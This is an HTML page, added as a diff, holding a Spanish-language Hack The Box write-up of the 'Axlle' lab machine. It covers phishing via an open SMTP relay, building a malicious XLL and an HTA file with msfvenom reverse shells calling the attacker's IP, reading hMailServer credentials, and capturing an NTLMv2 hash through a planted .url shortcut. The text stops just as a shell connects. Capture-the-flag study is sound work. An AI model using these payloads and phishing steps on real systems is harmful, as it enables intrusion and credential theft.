@@ -1,0 +1,557 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../pointed.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/pointedsec" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://pointedsec.vercel.app" target="_blank">
+                            <i class="fas fa-globe fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
+                            <i class="fas fa-box fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="hack-the-box-axlle-writeup">Hack The Box: Axlle Writeup</h1>
+<p>Welcome to my detailed writeup of the hard difficulty machine <strong>&ldquo;Axlle&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.253.213 --ulimit <span style="color:#ae81ff">5000</span> -g
+</span></span><span style="display:flex;"><span>10.129.253.213 -&gt; <span style="color:#f92672">[</span>25,53,80,88,135,139,389,445,464,593,3268,3269,5985,9389,49664,62017,62025,62021,62022,62040<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p25,53,80,88,135,139,389,445,464,593,3268,3269,5985,9389,49664,62017,62025,62021,62022,62040 -sCV -Pn 10.129.253.213 -oN allPorts
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-02 16:21 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.253.213
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>25/tcp    open  smtp          hMailServer smtpd
+</span></span><span style="display:flex;"><span>| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
+</span></span><span style="display:flex;"><span>|_ <span style="color:#ae81ff">211</span> DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>|_http-title: Axlle Development
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2024-08-02 12:21:50Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: axlle.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: axlle.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>62017/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>62021/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>62022/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>62025/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>62040/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2024-08-02T12:22:39
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>|_clock-skew: -1h59m41s
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 97.00 seconds
+</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.253.213 -oN allPorts.UDP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-02 16:23 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.253.213
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.041s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1497</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>53/udp  open  domain
+</span></span><span style="display:flex;"><span>88/udp  open  kerberos-sec
+</span></span><span style="display:flex;"><span>123/udp open  ntp
+</span></span></code></pre></div><p>Me llama la atención que esté el puerto 25 abierto, si el servicio de correo está mal configurado, podríamos enviar un correo a algún usuario y quizás podamos conseguir algún ataque de phising o algo parecido.</p>
+<h1 id="dns-enumeration">DNS Enumeration</h1>
+<p>Siempre que veo un servicio de DNS me gusta enumerarlo y realizar fuerza bruta a ver si encuentro algún subdominio.</p>
+<p>Para ello primero necesito un dominio, y haciendo un simple <code>whatweb</code> podemos encontrar un dominio.
+<code>axlle.htb</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://10.129.253.213
+</span></span><span style="display:flex;"><span>http://10.129.253.213 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>accounts@axlle.htb<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Microsoft-IIS/10.0<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.253.213<span style="color:#f92672">]</span>, Microsoft-IIS<span style="color:#f92672">[</span>10.0<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>Axlle Development<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Encontramos un NS</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> dig NS axlle.htb @10.129.253.213
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.24-1-Debian &lt;&lt;&gt;&gt; NS axlle.htb @10.129.253.213
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>;; Got answer:
+</span></span><span style="display:flex;"><span>;; -&gt;&gt;HEADER<span style="color:#e6db74">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span style="color:#ae81ff">12630</span>
+</span></span><span style="display:flex;"><span>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; OPT PSEUDOSECTION:
+</span></span><span style="display:flex;"><span>; EDNS: version: 0, flags:; udp: <span style="color:#ae81ff">4000</span>
+</span></span><span style="display:flex;"><span>;; QUESTION SECTION:
+</span></span><span style="display:flex;"><span>;axlle.htb.			IN	NS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; ANSWER SECTION:
+</span></span><span style="display:flex;"><span>axlle.htb.		3600	IN	NS	mainframe.axlle.htb.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; ADDITIONAL SECTION:
+</span></span><span style="display:flex;"><span>mainframe.axlle.htb.	1200	IN	A	10.129.253.213
+</span></span><span style="display:flex;"><span>mainframe.axlle.htb.	1200	IN	AAAA	dead:beef::f938:ff46:9a65:3d9
+</span></span><span style="display:flex;"><span>mainframe.axlle.htb.	1200	IN	AAAA	dead:beef::f6
+</span></span></code></pre></div><p>Por fuerza bruta no encontré nada.</p>
+<h1 id="http-enumeration">HTTP Enumeration</h1>
+<p>En el sitio web encontramos un correo
+<code>accounts@axlle.htb</code> -&gt; importante si existe un servicio SMTP detrás enumerar direcciones de correo.</p>
+<p>No consigo una NULL SESSION ni por RPC, LDAP ni SMB.</p>
+<h1 id="smtp-enumeration">SMTP Enumeration</h1>
+<p>Hay que tener en cuenta que está el WinRM expuesto.</p>
+<p>Nos damos cuenta de que este servicio está mal configurado ya que podemos mandar correos electrónicos sin necesidad de autenticarnos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Hello.
+</span></span><span style="display:flex;"><span>MAIL FROM:example@axlle.htb
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> OK
+</span></span><span style="display:flex;"><span>RCPT TO:accounts
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">550</span> A valid address is required.
+</span></span><span style="display:flex;"><span>RCPTO TO: accounts@axlle.htb
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">503</span> Bad sequence of commands
+</span></span><span style="display:flex;"><span>RCPT TO: accounts@axlle.htb
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> OK
+</span></span><span style="display:flex;"><span>DATA
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">354</span> OK, send.
+</span></span><span style="display:flex;"><span>Esto es una prueba
+</span></span><span style="display:flex;"><span>From: test@axlle.htb
+</span></span><span style="display:flex;"><span>To: accounts@axlle.htb
+</span></span><span style="display:flex;"><span>Subject: Email de prueba
+</span></span><span style="display:flex;"><span>Este es mi email de prueba
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>&lt;CRLF&gt;.&lt;CRLF250 Queued <span style="color:#f92672">(</span>47.297 seconds<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Lo podemos probar con <code>swaks</code> mas fácilmente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$  swaks --to accounts@axlle.htb --from pointed@axlle.htb --header <span style="color:#e6db74">&#34;Subject: test&#34;</span> --body <span style="color:#e6db74">&#34;please click here http://10.10.14.80:8081/&#34;</span> --server 10.129.253.213
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span> Trying 10.129.253.213:25...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span> Connected to 10.129.253.213.
+</span></span><span style="display:flex;"><span>&lt;-  <span style="color:#ae81ff">220</span> MAINFRAME ESMTP
+</span></span><span style="display:flex;"><span> -&gt; EHLO parrot
+</span></span><span style="display:flex;"><span>&lt;-  250-MAINFRAME
+</span></span><span style="display:flex;"><span>&lt;-  250-SIZE <span style="color:#ae81ff">20480000</span>
+</span></span><span style="display:flex;"><span>&lt;-  250-AUTH LOGIN
+</span></span><span style="display:flex;"><span>&lt;-  <span style="color:#ae81ff">250</span> HELP
+</span></span><span style="display:flex;"><span> -&gt; MAIL FROM:&lt;pointed@axlle.htb&gt;
+</span></span><span style="display:flex;"><span>&lt;-  <span style="color:#ae81ff">250</span> OK
+</span></span><span style="display:flex;"><span> -&gt; RCPT TO:&lt;accounts@axlle.htb&gt;
+</span></span><span style="display:flex;"><span>&lt;-  <span style="color:#ae81ff">250</span> OK
+</span></span><span style="display:flex;"><span> -&gt; DATA
+</span></span><span style="display:flex;"><span>&lt;-  <span style="color:#ae81ff">354</span> OK, send.
+</span></span><span style="display:flex;"><span> -&gt; Date: Fri, <span style="color:#ae81ff">02</span> Aug <span style="color:#ae81ff">2024</span> 16:41:16 +0200
+</span></span><span style="display:flex;"><span> -&gt; To: accounts@axlle.htb
+</span></span><span style="display:flex;"><span> -&gt; From: pointed@axlle.htb
+</span></span><span style="display:flex;"><span> -&gt; Subject: test
+</span></span><span style="display:flex;"><span> -&gt; Message-Id: &lt;20240802164116.003875@parrot&gt;
+</span></span><span style="display:flex;"><span> -&gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+</span></span><span style="display:flex;"><span> -&gt; 
+</span></span><span style="display:flex;"><span> -&gt; please click here http://10.10.14.80:8081/
+</span></span><span style="display:flex;"><span> -&gt; 
+</span></span><span style="display:flex;"><span> -&gt; 
+</span></span><span style="display:flex;"><span> -&gt; .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;-  <span style="color:#ae81ff">250</span> Queued <span style="color:#f92672">(</span>10.969 seconds<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> -&gt; QUIT
+</span></span><span style="display:flex;"><span>&lt;-  <span style="color:#ae81ff">221</span> goodbye
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===</span> Connection closed with remote host.
+</span></span></code></pre></div><p>Aunque no nos llega ninguna respuesta.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server <span style="color:#ae81ff">8081</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8081</span> <span style="color:#f92672">(</span>http://0.0.0.0:8081/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>Haciendo alusión al nombre de la máquina, quizás pueda mandar un archivo XLL a la víctima.</p>
+<p>Y aquí la cabeza me hizo click cuando leí el siguiente mensaje en la página principal.
+<code>If you have any outstanding invoices or requests, please email them to accounts@axlle.htb in Excel format. Please note that all macros are disabled due to our security posture. </code> y además vi que la imagen de la máquina es un pescador (phising).</p>
+<p>Voy a probar a mandar un Excel XLL malicioso como archivo a través de <code>swaks</code> a la cuenta <code>accounts@axlle.htb</code></p>
+<h1 id="foothold---creating-malicious-xll-file">Foothold -&gt; Creating Malicious XLL File</h1>
+<p>Primero tenemos que generar nuestro payload en formato binario. Importante que sea para una arquitectura de 64 bits.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.80 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f raw -o shell.bin
+</span></span></code></pre></div><p>Tras investigar, encontramos varios PoC para generar archivos XLL maliciosos, uno de ellos me funcionó.
+<a href="https://github.com/zimnyaa/xyrella">PoC</a>
+<a href="https://tishina.in/initial-access/xll-delivery">Post Explicativo</a></p>
+<p>Necesitamos instalar Nim, MinGW, Python y algunas dependencias de Nim</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>nimble install ptr_math
+</span></span><span style="display:flex;"><span>nimble install winim
+</span></span><span style="display:flex;"><span>nimble install nimcrypto
+</span></span></code></pre></div><p>Una vez teniendo todo eso, podemos generar nuestro archivo XLL malicioso.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>python build.py -e -o shell -s .\shell.bin
+</span></span></code></pre></div><p>Y ahora nos ponemos en escucha con <code>netcat</code> por el puerto 443.</p>
+<p>Y enviamos un correo a la cuenta de correo electrónico anteriormente encontrada adjuntando el archivo xll malicioso que hemos creado.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ swaks --from administrator@axlle.htb --to accounts@axlle.htb --server 10.129.253.213 --port <span style="color:#ae81ff">25</span> --header <span style="color:#e6db74">&#39;Excel file&#39;</span> --body <span style="color:#e6db74">&#39;Here is your excel file&#39;</span> --attach @shell.xll
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp 443
+</span></span><span style="display:flex;"><span>listening on [any] 443 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.80] from (UNKNOWN) [10.129.253.213] 62180
+</span></span><span style="display:flex;"><span>Microsoft Windows [Version 10.0.20348.2527]
+</span></span><span style="display:flex;"><span>(c) Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\<span style="color:#75715e">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>axlle\gideon.hamill
+</span></span></code></pre></div><p>Aquí todavía no está la flag.</p>
+<h1 id="user-pivoting">User Pivoting</h1>
+<p>Enumerando los correos del usuario <code>dallon.matrix</code> encontramos este mensaje</p>
+<pre tabindex="0"><code>Return-Path: webdevs@axlle.htb
+Received: from bumbag (Unknown [192.168.77.153])
+	by MAINFRAME with ESMTP
+	; Mon, 1 Jan 2024 06:32:24 -0800
+Date: Tue, 02 Jan 2024 01:32:23 +1100
+To: dallon.matrix@axlle.htb,calum.scott@axlle.htb,trent.langdon@axlle.htb,dan.kendo@axlle.htb,david.brice@axlle.htb,frankie.rose@axlle.htb,samantha.fade@axlle.htb,jess.adams@axlle.htb,emily.cook@axlle.htb,phoebe.graham@axlle.htb,matt.drew@axlle.htb,xavier.edmund@axlle.htb,baz.humphries@axlle.htb,jacob.greeny@axlle.htb
+From: webdevs@axlle.htb
+Subject: OSINT Application Testing
+Message-Id: &lt;20240102013223.019081@bumbag&gt;
+X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+Hi everyone,
+The Web Dev group is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.
+We ask that you drop any web shortcuts you have into the C:\inetpub\testing folder so we can test the automation.
+Yours in click-worthy URLs,
+The Web Dev Team
+</code></pre><p>Enumerando el servicio hMailServer, sabemos que hay un archivo llamado hMailServer.ini que se encuentra o en el directorio <code>Windows</code> o en directorio <code>Bin</code> del directorio raíz de instalación, dentro de este archivo se encuentran credenciales encriptadas.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Program<span style="color:#75715e"> Files (x86)\hMailServer\Bin&gt;type hMailServer.INI</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> hMailServer.INI
+</span></span><span style="display:flex;"><span>[Directories]
+</span></span><span style="display:flex;"><span>ProgramFolder=C:\Program Files (x86)\hMailServer
+</span></span><span style="display:flex;"><span>DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+</span></span><span style="display:flex;"><span>DataFolder=C:\Program Files (x86)\hMailServer\Data
+</span></span><span style="display:flex;"><span>LogFolder=C:\Program Files (x86)\hMailServer\Logs
+</span></span><span style="display:flex;"><span>TempFolder=C:\Program Files (x86)\hMailServer\Temp
+</span></span><span style="display:flex;"><span>EventFolder=C:\Program Files (x86)\hMailServer\Events
+</span></span><span style="display:flex;"><span>[GUILanguages]
+</span></span><span style="display:flex;"><span>ValidLanguages=english,swedish
+</span></span><span style="display:flex;"><span>[Security]
+</span></span><span style="display:flex;"><span>AdministratorPassword=52a1b2a1211e690998e0d2ccb653ff22
+</span></span><span style="display:flex;"><span>[Database]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Type</span>=MSSQLCE
+</span></span><span style="display:flex;"><span>Username=
+</span></span><span style="display:flex;"><span>Password=52abe4d2e16269ddddf7b166218e92d9
+</span></span><span style="display:flex;"><span>PasswordEncryption=1
+</span></span><span style="display:flex;"><span>Port=0
+</span></span><span style="display:flex;"><span>Server=
+</span></span><span style="display:flex;"><span>Database=hMailServer
+</span></span><span style="display:flex;"><span>Internal=1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Program<span style="color:#75715e"> Files (x86)\hMailServer\Bin&gt;</span>
+</span></span></code></pre></div><p>Podemos desencriptar esta contraseña, la de la base de datos, utilizando este <a href="https://github.com/GitMirar/hMailDatabasePasswordDecrypter">PoC</a>
+Pass -&gt; A02D41C55AC</p>
+<p>Pero esta pass no sirve para nada, por lo cual, vamos a aprovechar lo que sabemos del correo encontrado.
+<code>drop any web shortcuts you have into the C:\inetpub\testing folder so we can test the automation</code></p>
+<p>Creé un archivo .url en el directorio <code>C:\inetpub\testing</code> con este formato pero apuntando a mi máquina.</p>
+<pre tabindex="0"><code>[{000214A0-0000-0000-C000-000000000046}]
+
+Prop3=19,9
+
+[InternetShortcut]
+
+IDList=
+
+URL=file://51.79.185[.]145/pdf/data1.zip/pdf1.cpl
+
+IconIndex=13
+
+HotKey=0
+
+IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
+</code></pre><p>Y capturé un hash NTLMv2 que no pude crackear, pero esto me sirve para saber que el usuario dallon.matrix está abriendo estos archivos, así que ya tengo claro el vector de ataque.</p>
+<pre tabindex="0"><code>dallon.matrix::AXLLE:aaaaaaaaaaaaaaaa:8aba7b6bafde0dc8d454f35cf15b1029:010100000000000000e46e9dfde4da010fb198cd7ebfc63d000000000100100047004500460054006e006400710056000300100047004500460054006e00640071005600020010004e00730054004a004d00640054004b00040010004e00730054004a004d00640054004b000700080000e46e9dfde4da0106000400020000000800300030000000000000000100000000200000ee1ef70c7796141f1b5697e749cbbec39a1feb03c8cfc45e989aee8f08efcdc10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00380030000000000000000000
+</code></pre><p>Para ello, podemos crear el típico archivo HTA</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.80 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -f hta-psh -o evil.hta
+</span></span></code></pre></div><p>Nos creamos un archivo <code>evil.url</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat evil.url
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>InternetShortcut<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URL<span style="color:#f92672">=</span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\P</span>ublic<span style="color:#ae81ff">\D</span>ocuments<span style="color:#ae81ff">\e</span>vil.hta
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ShowCommand<span style="color:#f92672">=</span><span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>IconIndex<span style="color:#f92672">=</span><span style="color:#ae81ff">247</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>IconFile<span style="color:#f92672">=</span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>hell32.dll
+</span></span></code></pre></div><p>El archivo <code>evil.hta</code> que hemos creado con <code>msfvenom</code> lo dejamos en <code>C:\Users\Public\Documents\evil.hta</code></p>
+<p>Ahora, nos ponemos en escucha con <code>netcat</code> por el puerto 443.</p>
+<p>Subimos el archivo <code>evil.url</code> a <code>C:\inetpub\testing</code> como bien decía la nota y&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.80<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.253.213<span style="color:#f92672">]</span> <span style="color:#ae81ff">60887</span>
